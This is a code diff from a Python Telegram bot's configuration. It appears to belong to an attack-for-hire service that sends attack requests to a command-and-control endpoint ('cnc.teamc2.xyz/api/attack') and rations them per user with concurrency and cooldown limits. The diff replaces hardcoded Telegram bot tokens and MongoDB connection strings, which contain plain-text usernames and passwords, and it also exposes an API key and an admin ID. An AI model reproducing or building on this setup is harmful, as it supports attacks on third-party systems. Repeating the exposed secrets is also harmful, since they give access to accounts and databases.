@@ -20,14 +20,14 @@ def get_current_ist():
 def format_ist_time(dt):
     return dt.strftime('%d %b %Y, %I:%M:%S %p') + " IST"
 
-BOT_TOKEN = "8291785662:AAHj4cvF3Hxjgoqk7Dkq-1ZluwCH1GtElVk"
+BOT_TOKEN = "8760406918:AAFOIHhACXIb96Ytt2TGH5ZopfQr97pTBeg"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
 API_KEY = "F6XMND"
 MAX_CONCURRENT = 2
 COOLDOWN_TIME = 30
 
-MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
+MONGO_URI = "mongodb+srv://MONSTER:XFUr4YZChyAVkeqR@monster.pntdmjc.mongodb.net/?appName=MONSTER"
 client = MongoClient(MONGO_URI)
 db = client["xsilent_bot"]
 users_collection = db["users"]
